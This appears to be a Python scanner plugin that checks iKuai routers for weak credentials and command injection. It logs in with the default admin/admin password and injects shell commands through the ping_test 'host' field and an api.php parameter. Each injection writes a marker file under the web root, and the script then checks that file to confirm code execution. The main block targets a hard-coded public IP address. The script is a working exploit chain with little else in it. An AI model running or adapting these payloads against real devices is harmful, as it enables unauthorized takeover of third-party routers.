#!/usr/bin/env python
#-*- coding:utf-8 -*-

def assign(service, arg):
    if service == 'ikuai':
        return True, arg

def audit(arg):
    post='user=admin&pass=admin'
    url=arg+'login/x'
    code, head, res, errcode, _ = curl.curl2(url,post=post)
    if code==200 and '\u767b\u5f55\u6210\u529f' in res:
        security_hole("weak password: admin admin")
        upload_url=arg+'Tools/ping_test/start'
        upload_post="host=www.baidu.com' | echo test_vul >/tmp/ikuai/www/resources/js/vul.js |/usr/ikuai/script/Ping start host='www.baidu.com&src=&count=10"
        code, head, res, errcode, _ = curl.curl2(upload_url,post=upload_post)
        if code==200 and '[info]shell:' in res:
            shell_url=arg+'resources/js/vul.js'
            code, head, res, errcode, _ = curl.curl2(shell_url)
            if code==200 and 'test_vul' in res:
                security_hole('Commend Exec'+upload_url)
                upload_url=arg+'Tools/ping_test/start'
        
        upload2_url=arg+'api.php'
        upload2_post="type=home&get_lans_top10_param[type]=123;echo test_vul+>+/tmp/ikuai/www/resources/js/vultwo.js"
        code, head, res, errcode, _ = curl.curl2(upload2_url,post=upload2_post)
        if code==200 and 'protocal' in res:
            shell2_url=arg+'resources/js/vultwo.js'
            code, head, res, errcode, _ = curl.curl2(shell2_url)
            if code==200 and 'test_vul' in res:
                security_hole('Commend Exec'+upload2_url)



if __name__ == '__main__':
    from dummy import *
    audit(assign('ikuai', 'http://221.10.198.235:81/')[1])